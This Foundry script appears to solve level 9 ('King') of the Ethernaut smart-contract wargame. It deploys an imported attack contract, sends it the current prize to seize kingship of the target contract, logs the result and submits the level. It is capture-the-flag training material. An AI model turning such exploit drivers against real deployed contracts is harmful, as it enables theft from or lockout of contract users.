// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {King} from "../src/Level09.sol";
import {Attack} from "../src/Level09Attack.sol";

contract Level09 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        King instance = King(payable(vm.envAddress("LVL09_ADDR")));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();
        address kingBefore = instance._king();
        console2.log("kingBefore: ", kingBefore);
        address owner = instance.owner();
        console2.log("owner: ", owner);

        uint256 prize = instance.prize();
        bool success = attack.attackKing{value: prize}(payable(instance));

        address kingAfter = instance._king();
        console2.log("kingAfter: ", kingAfter);
        console2.log("success: ", success);
        if (kingAfter == me && success) {
            console2.log("Level09: Success");
            ethernaut.submitLevelInstance(address(instance));
        } else {
            console2.log("Level09: Failed");
        }

        vm.stopBroadcast();
    }
}
